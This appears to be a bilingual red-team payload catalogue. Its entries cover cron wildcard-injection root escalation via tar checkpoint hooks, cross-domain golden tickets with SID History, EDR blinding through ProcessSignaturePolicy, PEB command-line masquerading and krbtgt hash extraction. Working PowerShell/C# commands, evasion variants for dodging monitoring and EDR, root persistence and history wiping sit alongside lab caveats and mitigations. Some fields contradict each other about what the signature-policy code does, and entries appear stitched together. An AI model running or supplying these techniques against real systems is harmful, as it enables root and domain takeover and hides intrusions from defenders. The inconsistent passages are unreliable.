name.zh: Cron 所有权与可写路径审计

description.zh: 审计 cron 任务定义、可写脚本与通配符注入点，验证计划任务提权。
description.en: Audits cron job definitions for root-owned scripts in writable paths and wildcard injection points, then plants an argument-expanding file so the scheduled task executes attacker code as root.

prerequisites.zh: 确认 Cron 所有权与可写路径审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Cron Ownership and Writable-Path Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

description.zh: 查看系统计划任务；root 运行且路径可写的任务即锁定 cron 提权候选。
description.en: Review system cron jobs; root-run jobs with writable paths pin cron escalation candidates.

description.zh: 检查任务脚本权限；普通用户对脚本或其父目录具备写权限即确认可注入执行。
description.en: Check task-script permissions; normal-user write access to the script or its directory confirms injectable execution.

title.zh: tar checkpoint 钩子执行测试脚本
title.en: Execute test script via tar checkpoint hook

description.zh: 判据: 前提是存在 root 定时以通配符归档当前目录的 tar 任务；先准备会输出标记或回连监听的 run.sh，再创建 --checkpoint=1 与 --checkpoint-action=exec=sh run.sh 两个文件；下个调度周期钩子以 root 执行 run.sh，出现标记输出或收到回连即验证通配符注入路径可达。
description.en: Creates the cron fixture archive while executing fixtures/cron.sh through the --checkpoint-action hook, confirming reachability of tar argument injection from a writable path.

opsecTips.zh: root cron 注入在下一调度周期真实执行——验证后立即移除注入文件与任务改动；通配符注入的参数文件命名避开 glob 语义。
opsecTips.en: Root-cron injection executes on the next schedule tick — remove injected files and task changes immediately after verification, and name wildcard-injection files to avoid unintended glob semantics.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: 规避变体：通配符注入提权

description.zh: 规避点：tar 通配符注入不修改 cron 定义本身，绕过 crontab 监控。判据：收到 root shell。
description.en: Wildcard injection never touches the cron definition. Success: root shell arrives.

description.zh: 规避点：覆盖 cron 脚本调用的无路径命令，不改脚本本体。判据：定时触发回连。
description.en: Shadows an unqualified command instead of editing the script. Success: scheduled callback.

title.zh: 规避变体：cron.d 注入持久化

description.zh: 规避点：独立文件持久化不篡改既有 crontab，降低 diff 告警。判据：每分钟以 root 执行 /tmp/x。
description.en: A separate file avoids modifying existing crontabs. Success: /tmp/x runs as root every minute.

description.zh: 规避点：删除载荷与注入项并清历史。判据：相关文件与条目全部消失。
description.en: Removes payloads, injected entries, and history. Success: all artifacts gone.

description.zh: 读取 crontab 与各 cron 目录内容；由 root 周期运行且脚本路径可写的任务即锁定命令注入点，记录调度间隔评估等待时间。
description.en: Read crontab and the cron directories; root-scheduled jobs with writable script paths become injection points, with intervals hinting at wait time.

title.zh: 检查脚本与目录写权限
title.en: Check script and directory write access

description.zh: 查看任务脚本及其父目录的权限细节；普通用户具备写权限即可向脚本追加命令，等待下个调度周期以 root 身份执行。
description.en: Inspect the job script and its parent directory; ordinary-user write access means appended commands run as root on the next cycle.

description.zh: 以 tar 的 checkpoint-action 钩子在归档创建时执行指定脚本；钩子被触发即验证通配符注入路径可达，把同样的钩子文件放入 root 的 cron 以通配符归档的业务目录，即可让计划任务以 root 执行任意命令完成提权。
description.en: Use tar's --checkpoint-action hook to execute a script during archive creation; the hook firing proves wildcard injection works and the same trick escalates via cron.

overview.zh: 该 Payload 覆盖 Cron 所有权与可写路径提权审计场景，检验 root 计划任务对可写脚本与归档钩子的执行边界。验证维度含任务清单核查、脚本权限检查与 tar checkpoint 钩子验证三步，对应第 1 至第 3 步。
overview.en: This payload covers cron ownership and writable-path escalation auditing, testing how root-scheduled jobs handle writable scripts and archive hooks. Validation covers task-list review, script-permission checks and a tar checkpoint-hook verification, mapped to steps 1 through 3.

vulnerability.zh: 根因在于 root 计划任务引用的脚本或其父目录对普通用户可写，或以通配方式处理文件名：攻击者注入命令或借 tar 参数展开即让任务以 root 执行任意代码。
vulnerability.en: The root cause is root cron jobs referencing scripts or parent directories writable by standard users, or expanding filenames via wildcards: injected commands or tar argument expansion let the job run attacker code as root.

exploitation.zh: 第 1 步查看 etc 下 crontab 与计划任务目录，锁定 root 运行且路径可写的任务；第 2 步检查目标脚本及其父目录权限，普通用户可写即确认注入点；第 3 步在测试目录用 tar checkpoint 钩子执行夹具脚本，验证通配参数注入的可达性。以 root 上下文执行痕迹为成功判据。占位符在全局变量菜单替换；钩子测试仅在隔离目录进行。
exploitation.en: In step 1, review the etc crontab and scheduled-task directories, locking onto root-run jobs with writable paths. In step 2, check target-script and parent-directory permissions; standard-user writability marks the injection point. In step 3, use a tar checkpoint hook to execute a fixture script in a test directory, validating wildcard argument-injection reachability. Judge success by root-context execution traces. Replace placeholders via the global variables menu; run hook tests only in isolated directories.

mitigation.zh:
root 任务脚本与父目录仅 root 可写，避免通配调用并显式列出文件，cron 变更纳入审计：
    chown root:root {LAB_CRON_SCRIPT} && chmod 700 {LAB_CRON_SCRIPT}
    chmod 600 /etc/cron.d/* && chown root:root /etc/cron.d
    auditctl -w /etc/cron.d/ -p wa -k cron_change
mitigation.en: Restrict job scripts and parent directories to root writes, avoid wildcard invocations by listing files explicitly, and audit cron edits and runs. After the fix, replay steps 2 and 3: writes should be denied and hooks never fire.

analysis.zh: Cron 所有权与可写路径审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Cron Ownership and Writable-Path Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

review.rationale: N-0020 C3 回填 tar checkpoint 通配符注入命令（=execution 步3）；N-0024 步3 syntaxBreakdown 摘除执行链标记条目；N-0026 references 第二条换 crontab 手册。

name.zh: AD 跨域信任配置审计

description.zh: 枚举域与林信任的方向、传递性与 TGT 转发能力，验证跨信任边界的防护强度。
description.en: Enumerates the direction, transitivity, and TGT-forwarding behavior of domain and forest trusts, showing that missing SID filtering or selective authentication lets a forged ticket with SID History cross the trust boundary.

prerequisites.zh: 确认 AD 跨域信任配置审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for AD Cross-Domain Trust Configuration Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

description.zh: 枚举域信任关系；成功时输出信任列表，含方向、类型与对端域名。
description.en: Enumerate domain trust relationships; output listing trusts with direction, type, and peer domain confirms success.

description.zh: 枚举森林信任关系；成功时输出 forest trust 列表及其 trust attributes。
description.en: Enumerate forest trust relationships; output listing forest trusts with trust attributes confirms success.

title.en: AD Cross-Domain Trust Configuration Audit Reviewed Command 3

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_DOMAIN_CROSS_TRUST_E_3 与蓝队日志；成功时列出目标域的用户清单。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_DOMAIN_CROSS_TRUST_E_3 with blue-team logs; a user listing for the target domain confirms success.

title.en: AD Cross-Domain Trust Configuration Audit Reviewed Command 4

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_DOMAIN_CROSS_TRUST_E_4 与蓝队日志；成功时列出目标域的组清单。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_DOMAIN_CROSS_TRUST_E_4 with blue-team logs; a group listing for the target domain confirms success.

title.zh: 伪造跨域信任黄金票据
title.en: AD Cross-Domain Trust Configuration Audit Reviewed Command 5

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_DOMAIN_CROSS_TRUST_E_5 与蓝队日志；成功时黄金票据注入当前会话（klist 可见 Administrator 票据），并能以管理员身份访问目标域资源即确认 519 SID History 生效。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_DOMAIN_CROSS_TRUST_E_5 with blue-team logs; the cross-domain golden ticket injecting with klist showing a ticket carrying SID history 519 confirms success.

title.zh: Rubeus 哈希换 TGT 注入
title.en: AD Cross-Domain Trust Configuration Audit Reviewed Command 6

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_DOMAIN_CROSS_TRUST_E_6 与蓝队日志；成功时 asktgt 获取 TGT 并写入票据缓存，klist 可见。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_DOMAIN_CROSS_TRUST_E_6 with blue-team logs; asktgt obtaining a TGT written to the cache and visible in klist confirms success.

explanation.en: pass the ticket into the current session

analysis.zh: AD 跨域信任配置审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: AD Cross-Domain Trust Configuration Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 信任枚举与 SID History 伪造只作用于实验域对；伪造票据有效期压到最短并在验证后立即清除。
opsecTips.en: Restrict trust enumeration and SID-History forgery to the lab domain pair, issue forged tickets with the shortest feasible lifetime, and purge them right after verification.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 规避 PowerView/DSInternals 模块特征：系统自带 nltest 枚举全部信任；输出信任域清单即成功。
description.en: Enumerate trusts with the built-in nltest instead of PowerView modules; a trust list output confirms success.

description.zh: 规避对 PowerShell 域枚举的监控：直接 LDAP 查询信任对象属性；返回 trustPartner 即成功。
description.en: Query trust objects directly over LDAP to bypass PowerShell domain-enumeration monitoring; returned trustPartner values confirm success.

title.zh: AD 模块 Get-ADTrust 变体

description.zh: 以官方管理模块替代攻击框架特征：RSAT ActiveDirectory 模块属于运维常态流量；输出信任矩阵即成功。
description.en: Use the RSAT ActiveDirectory module, blending with routine admin traffic; an output trust matrix confirms success.

description.zh: 运行 Get-NetDomainTrust 列出信任方向与类型；存在 INBOUND 或双向信任的目标域即跨域攻击候选。
description.en: Run Get-NetDomainTrust to list trust direction and type; INBOUND or bidirectional trusts mark candidate target domains.

title.zh: 摸清林内信任与目标域人员
title.en: Chart forest trusts and target accounts

description.zh: 用 Get-NetForestTrust 扩到林级，再以 Get-NetUser 与 Get-NetGroup 枚举目标域账号与高价值组；锁定管理员清单即完成跨域情报储备。
description.en: Expand with Get-NetForestTrust, then enumerate target-domain users and groups with Get-NetUser/Get-NetGroup; locking the admin list completes cross-domain intelligence.

description.zh: 用源域 krbtgt 哈希构造携带目标域企业管理员组 SID（目标域 SID 加 RID 519，即 /sids 参数）的黄金票据并注入；klist 出现新票据并能以管理员身份访问目标域资源即跨域身份伪造完成。
description.en: Build a golden ticket with the source krbtgt hash carrying the target S-519 SID and inject it; the ticket visible in klist completes the cross-domain admin forgery.

title.zh: 请求目标域票据完成接管
title.en: Request target-domain tickets to finish takeover

description.zh: 用 Rubeus asktgt（或 Kekeo tgt::ask）以哈希直接请求目标域 TGT；获得可用票据后访问目标域服务即完成跨域控制闭环。
description.en: Request a target-domain TGT directly with asktgt.exe using the hash; a usable ticket accessing target services closes the cross-domain takeover.

overview.zh: AD 跨域信任配置审计覆盖跨域信任滥用场景：针对存在域间或森林间信任的实验环境，验证信任方向与 SID 过滤配置能否被用于跨域越权。验证维度涵盖域信任与森林信任枚举、跨域用户组清点、SID History 黄金票据伪造与 TGT 申请六类步骤。
overview.en: AD Cross-Domain Trust Configuration Audit covers cross-domain trust abuse: in lab environments with inter-domain or forest trusts, verify whether trust direction and SID filtering configurations enable cross-domain escalation. Verification dimensions cover domain and forest trust enumeration, cross-domain user/group inventory, SID History golden ticket forgery, and TGT requests — six steps.

vulnerability.zh: 根因是外部信任未启用 SID 过滤或选择性认证：攻击者持有源域 krbtgt 哈希即可伪造携带目标域高危组 SID History 的票据跨域通行；双向信任叠加缺失过滤时，单个域沦陷会沿信任链放大为森林级影响。
vulnerability.en: The root cause is external trusts without SID filtering or selective authentication: holding the source domain's krbtgt hash lets an attacker forge tickets carrying target-domain high-privilege SID History entries; bidirectional trusts without filtering amplify a single domain compromise into forest-level impact along the trust chain.

exploitation.zh: 按 Payload 列表顺序使用：第 1、2 步用 Get-NetDomainTrust 与 Get-NetForestTrust 枚举信任方向与 trust attributes，确认双向信任且未启用 SID 过滤即发现缺口；第 3、4 步清点目标域用户与组，锁定高价值目标；第 5 步用 mimikatz kerberos::golden 伪造带目标域 519 SID History 的跨域黄金票据并 /ptt 注入，klist 可见即确认成功；第 6 步用 asktgt 申请目标域 TGT 补充验证可达性。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: steps 1 and 2 enumerate trust direction and trust attributes with Get-NetDomainTrust and Get-NetForestTrust — bidirectional trusts without SID filtering reveal the gap; steps 3 and 4 inventory target-domain users and groups to lock high-value targets; step 5 forges a cross-domain golden ticket carrying the target domain's 519 SID History with mimikatz kerberos::golden and injects it via /ptt — visible in klist confirms success; step 6 requests a target-domain TGT with asktgt to confirm reachability. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
外部信任启用 SID 过滤与选择性认证，两阶段轮换全部域 krbtgt（首次随机重置、超票据寿命后再次重置），监控带 SID History 的票据：
    netdom trust corp.local /domain:partner.external /quarantine:yes
    netdom trust corp.local /domain:partner.external /selectiveauth:yes
    Set-ADAccountPassword -Reset -Identity krbtgt -NewPassword (Read-Host -AsSecureString)
    修复后用第 5 步样例回归，带 SID History 的票据应被目标域 KDC 拒绝。
mitigation.en: Enable SID filtering and selective authentication on external trusts, rotate all domains' krbtgt passwords periodically (twice, per registry policy), and monitor ticket requests carrying SID History plus anomalous cross-domain TGTs. After the fix, regress with the step 5 sample: tickets with SID History must be rejected by the target domain's KDC.

review.rationale: N-0046 mitigation 摘除不存在的 /enablesidfilter 行（netdom SID 过滤即 /quarantine:yes）；N-0025 步3-6 DOMAIN_DOMAIN 标记去重。

name.zh: BlockDLLs 非签名 DLL 加载限制绕过

description.zh: 验证进程模块签名策略（blockdlls、签名加载限制）下的加载绕过面。
description.en: Sets ProcessSignaturePolicy to Microsoft-signed-only on the payload process and confirms the EDR's unsigned userland injection DLLs are refused, leaving the process unmonitored from within.

category.zh: 终端防护与遥测完整性

subCategory.zh: 进程伪装与内存载荷规避

prerequisites.zh: 确认 进程模块签名策略审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Process Module-Signature Policy Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

title.en: Process Module-Signature Policy Audit Reviewed Command 1

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EVASION_EVASION_BLOCKDLLS_E_1 与蓝队日志；成功时输出实验进程的缓解策略明细。
description.en: Run in the isolated authorization and correlate PAYLOADER_EVASION_EVASION_BLOCKDLLS_E_1 with blue-team logs; mitigation policy details for the lab process returned confirms success.

explanation.zh: 读取进程缓解策略的 PowerShell cmdlet
explanation.en: PowerShell cmdlet that reads process mitigation policies

explanation.zh: 按进程映像名查询并输出其缓解配置，可据此核对签名级 DLL 过滤（SignatureMicrosoft）及 ASLR、DEP 等 Provider 项；真正启用拦截需通过策略写入（见同条目 e[2] 的 SetProcessMitigationPolicy）
explanation.en: Queries by process image name and prints its mitigation configuration, including the signature-level DLL filter (SignatureMicrosoft) and provider items such as ASLR and DEP; enforcing the filter requires writing the policy via SetProcessMitigationPolicy (see e[2] in this entry)

title.zh: 复读缓解策略核对一致
title.en: Process Module-Signature Policy Audit Reviewed Command 2

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EVASION_EVASION_BLOCKDLLS_E_2 与蓝队日志；成功时再次输出同一进程的策略明细，两次结果一致即确认策略读取稳定。
description.en: Run in the isolated authorization and correlate PAYLOADER_EVASION_EVASION_BLOCKDLLS_E_2 with blue-team logs; the policy details repeated for multi-source consistency confirms success.

description.zh: 以 C# 设置进程签名策略；成功时策略生效，未签名 DLL 加载被拒绝。
description.en: Set the process signature policy in C#; the policy taking effect and unsigned DLL loads being rejected confirms success.

opsecTips.zh: 签名策略进程对 EDR 不可见——只在隔离主机验证并保持会话时长最短；验证后正常退出进程让 EDR 恢复视野。
opsecTips.en: Signature-policy processes are invisible to EDR — validate on an isolated host with the shortest possible session, and exit cleanly so EDR regains visibility.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

wafBypass.command: $src='using System;using System.Runtime.InteropServices;public class M{[DllImport("kernel32.dll",SetLastError=true)]public static extern bool SetProcessMitigationPolicy(int p,ref int b,IntPtr s);}';Add-Type -TypeDefinition $src -Name M -Namespace W;$b=0x10000000;[W.M]::SetProcessMitigationPolicy(7,[ref]$b,[IntPtr]4);$p=Start-Process cmd -ArgumentList '/c','echo child-ready' -WindowStyle Hidden -PassThru;'child-pid='+$p.Id

description.zh: 属性继承链变体：Add-Type 内联编译后以 SetProcessMitigationPolicy 直设当前进程签名策略位（0x10000000），再派生子进程验证策略继承后的加载面——读策略的旧命令不含任何绕过动作，已替换。判据：child-pid 输出且子进程加载非签名 DLL 不被阻断；策略位编码落地前需在实验室实测（报告口径）。
description.en: Inheritance-chain variant: inline-compiles via Add-Type and sets the current-process signature-policy bits with SetProcessMitigationPolicy (0x10000000), then spawns a child to exercise the inherited policy - the old policy-read command carried no bypass action and is replaced. Success: child-pid prints and the child loads unsigned DLLs unblocked; verify the bit encoding in the lab before relying on it.

title.zh: C# 直接调用规避变体

wafBypass.command: $src='using System;using System.Runtime.InteropServices;public class M{[DllImport("kernel32.dll",SetLastError=true)]public static extern bool SetProcessMitigationPolicy(int p,ref int b,IntPtr s);}';Add-Type -TypeDefinition $src -Name M -Namespace W;$b=0x10000000;'policy-set='+[W.M]::SetProcessMitigationPolicy(7,[ref]$b,[IntPtr]4);try{Add-Type -TypeDefinition 'public class T{public static int Add(int a,int b){return a+b;}}' -Name T -Namespace W2;'unsigned-load=allowed (policy NOT effective)'}catch{'unsigned-load=blocked ('+$_.Exception.GetType().Name+') - policy effective'}

description.zh: 绕过 PowerShell 层遥测：Add-Type 编译 C# 后直接 P/Invoke 对当前进程启用 ProcessSignaturePolicy 的 BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON（0x10000000），再加载未签名程序集验证。成功判据：policy-set=True 且后续 Add-Type 加载未签名 DLL 被拒（抛异常）。
description.en: Compiles C# inline and P/Invokes SetProcessMitigationPolicy to turn on BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON (0x10000000) for the current process, then proves it by rejecting an unsigned assembly. Success: policy-set=True and the follow-up Add-Type throws.

explanation.zh: 策略 7 = ProcessSignaturePolicy，缓冲 4 字节
负向断言：策略生效后未签名程序集加载被拒
explanation.en: Negative assertion: an unsigned assembly fails to load once the policy holds

overview.zh: 进程模块签名策略审计覆盖进程缓解策略场景：针对安全产品依赖 DLL 注入实现监控的机制，验证签名策略能否阻止未签名 DLL 进入目标进程。验证维度涵盖 Get-ProcessMitigation 策略读取、多来源一致性核对与 C# SetProcessMitigationPolicy 设置三类。
overview.en: Process Module-Signature Policy Audit covers process mitigation policy: given security products that monitor via DLL injection, verify whether a signature policy can stop unsigned DLLs from entering the target process. Verification dimensions cover Get-ProcessMitigation policy reads, multi-source consistency checks, and C# SetProcessMitigationPolicy configuration.

vulnerability.zh: 根因是 Windows 允许为进程设置 ProcessSignaturePolicy（仅 Microsoft 签名可载入），而 EDR 常以用户态 DLL 注入实现监控；策略生效后未签名的安全产品 DLL 被拒载，进程内遥测随之静默，形成检测盲区。
vulnerability.en: The root cause is that Windows lets a process set ProcessSignaturePolicy (Microsoft-signed DLLs only), while EDRs commonly monitor via user-mode DLL injection; once the policy is active, unsigned security-product DLLs are refused and in-process telemetry falls silent, creating a detection blind spot.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 Get-ProcessMitigation 读取实验进程的缓解策略明细；第 2 步重复读取并核对两次输出一致，确认策略读取稳定；第 3 步以 C# 调用 SetProcessMitigationPolicy 设置 SignatureLevel=0x0F，未签名 DLL 加载被拒即确认策略生效，同时观察安全产品监控是否因此中断。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 reads the lab process's mitigation details with Get-ProcessMitigation; step 2 repeats the read for multi-source consistency; step 3 sets SignatureLevel=0x0F via C# SetProcessMitigationPolicy — unsigned DLL loads refused confirms the policy took effect, while observing whether security-product monitoring breaks. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
为安全产品进程预配置签名策略豁免并启用防篡改保护，EDR 补充内核回调数据源，监控 SetProcessMitigationPolicy 与 DLL 加载失败：
    Set-MpPreference -DisableTamperProtection $false
    New-CIPolicy -Scan -ScanPath 'C:\Program Files\EDR' -Level SignedFiles -FilePath C:\wdac\edr.xml
mitigation.en: Pre-configure signature-policy exemptions for security-product processes and enable tamper protection; monitor SetProcessMitigationPolicy calls and security-product DLL load failures, and give EDRs kernel-callback data sources to avoid single-point blindness. After the fix, regress with the step 3 sample: policy setting must be blocked or alerted immediately.

analysis.zh: 进程模块签名策略审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Process Module-Signature Policy Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

review.rationale: N-0020 C1/C2 回填 Get-ProcessMitigation 读取与复读比对命令（=execution 步1/2）；N-0025 步1/2 描述 EVASION_EVASION 标记去重。

wafBypass.command: $src='using System;using System.Runtime.InteropServices;public class M{[DllImport("ntdll.dll")]public static extern int NtQueryInformationProcess(IntPtr h,int c,byte[] bi,int l,out int rl);}';Add-Type -TypeDefinition $src -Name M -Namespace W;$bi=New-Object byte[] 48;$rl=0;[void][W.M]::NtQueryInformationProcess([System.Diagnostics.Process]::GetCurrentProcess().Handle,0,$bi,48,[ref]$rl);$peb=[BitConverter]::ToInt64($bi,8);$pp=[Runtime.InteropServices.Marshal]::ReadIntPtr([IntPtr]$peb,0x20);$fake='C:\Windows\System32\notepad.exe -masqueraded';[Runtime.InteropServices.Marshal]::WriteInt64([IntPtr]$pp,0x70,$fake.Length*2);[Runtime.InteropServices.Marshal]::WriteInt16([IntPtr]$pp,0x72,$fake.Length*2+2);$buf=[Runtime.InteropServices.Marshal]::ReadIntPtr([IntPtr]$pp,0x78);[Runtime.InteropServices.Marshal]::Copy([System.Text.Encoding]::Unicode.GetBytes($fake),0,$buf,$fake.Length*2);'wmi-cmdline-now='+(Get-CimInstance Win32_Process -Filter ("ProcessId=$PID")).CommandLine

description.en: Rewrites the CommandLine UNICODE_STRING inside the PEB (x64 offsets 0x70/0x72/0x78) after resolving it via NtQueryInformationProcess, so telemetry reads a masqueraded notepad.exe value. Success: the trailing Get-CimInstance shows the masqueraded command line.

explanation.zh: 取 PBI，偏移 8 为 PEB 基址
explanation.en: Fetch the PBI; offset 8 holds the PEB base

explanation.zh: 覆写 CommandLine.Buffer（0x78）内容为伪装形态
explanation.en: Overwrite the CommandLine.Buffer (0x78) contents with the masqueraded form

overview.zh: 进程映像与命令行一致性审计覆盖进程伪装检测场景：针对依赖映像路径与命令行关联的检测逻辑，验证映像与名称不一致的进程能否被稳定识别。验证维度涵盖 spawnto/ppid 配置核对、映像复制伪装执行与 Win32_Process 多源字段比对三类。
overview.en: Process Image and Command-Line Consistency Audit covers process masquerading detection: for detection logic relying on image-path and command-line correlation, verify whether processes with image/name mismatches are reliably identified. Verification dimensions cover spawnto/ppid configuration checks, image-copy masquerade execution, and Win32_Process multi-source field comparison.

vulnerability.zh: 根因是进程名可复制而映像路径不可伪造，仅按进程名或父进程判断的检测即被绕过；伪装进程在用户可写目录运行时，ExecutablePath 与其声称的系统进程名必然不一致，构成稳定检测信号。
vulnerability.en: The root cause is that process names are copyable while image paths are not, so detection judging only by process name or parent is bypassed; a masquerading process running from a user-writable directory necessarily mismatches ExecutablePath against its claimed system process name — a stable detection signal.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 spawnto 与 ppid 配置指定派生进程映像与父进程，配置生效即确认起点；第 2 步复制 cmd.exe 为临时目录下的 svchost.exe 并隐藏窗口执行，Get-Process 显示其 Path 指向临时目录即确认伪装成立；第 3 步用 Win32_Process 输出 PID/父 PID/路径/命令行清单，比对映像路径与命令行不一致项完成检测验证。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 sets the derived process image and parent with spawnto and ppid — effective configuration marks the starting point; step 2 copies cmd.exe as svchost.exe in a temp directory and runs it hidden — Get-Process showing Path in the temp directory confirms the masquerade; step 3 lists PID/parent PID/path/command line with Win32_Process and compares image-path versus command-line mismatches to complete detection validation. Replace LAB_* placeholders via the global variables menu.

mitigation.en: Validate by image path, signature, and parent chain rather than process name; alert on system process names appearing from user-writable directories; enable Sysmon event 1 with full command lines. After the fix, regress with the step 2 sample: the masquerading process must trigger an image-mismatch alert.

name.zh: 黄金票据前置条件与检测审计

description.zh: 验证 krbtgt 哈希可获取性（需域管级授权）与伪造黄金票据的检测面，评估该链前提。
description.en: With domain-admin authorization, validates krbtgt hash reachability and forges a golden ticket carrying arbitrary group SIDs, showing that the KDC cannot distinguish it from a genuine ticket and detection hinges on the double krbtgt password reset.

prerequisites.zh: 确认 黄金票据前置条件与检测审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Golden-Ticket Preconditions and Detection Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

title.en: Validation step 1 for Golden-Ticket Preconditions and Detection Audit

description.zh: 获取 krbtgt 账户哈希；成功时输出 krbtgt NTLM 哈希与域 SID。
description.en: Obtain the krbtgt account hash; output showing the krbtgt NTLM hash and domain SID confirms success.

title.en: Golden-Ticket Preconditions and Detection Audit Reviewed Command 2

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_GOLDEN_TICKET_E_2 与蓝队日志；成功时确认当前用户上下文并记录基线身份。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_GOLDEN_TICKET_E_2 with blue-team logs; the current user context recorded as the identity baseline confirms success.

title.en: Golden-Ticket Preconditions and Detection Audit Reviewed Command 3

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_GOLDEN_TICKET_E_3 与蓝队日志；成功时黄金票据注入成功，klist 显示域管理员票据且可访问任意服务。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_GOLDEN_TICKET_E_3 with blue-team logs; the golden ticket injecting with klist showing a domain-admin ticket able to reach any service confirms success.

title.en: Golden-Ticket Preconditions and Detection Audit Reviewed Command 4

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_GOLDEN_TICKET_E_4 与蓝队日志；成功时 klist 列出注入的以 Administrator 身份向 krbtgt 服务申请的 TGT（即伪造的黄金票据）。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_GOLDEN_TICKET_E_4 with blue-team logs; klist listing the injected krbtgt ticket confirms success.

opsecTips.zh: 伪造票据一旦使用即污染 Kerberos 基线——只在实验域使用并在验证后清除；krbtgt 材料不落盘。
opsecTips.en: A used golden ticket pollutes the Kerberos baseline — use it only in the lab domain and purge tickets afterwards; never persist krbtgt material.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 规避 mimikatz lsadump 特征与本地落地：远程仅提取 krbtgt 哈希；输出 krbtgt NTLM 即黄金票据前提成立。
description.en: Extract only the krbtgt hash remotely, avoiding mimikatz lsadump signatures and local file drops; output krbtgt NTLM confirms the golden-ticket prerequisite.

description.zh: 以管理模块走复制协议取哈希，避开敏感工具进程告警；输出 SupplementalCredentials 即成功。
description.en: Fetch the hash over the replication protocol via an admin module, dodging sensitive-tool process alerts; SupplementalCredentials output confirms success.

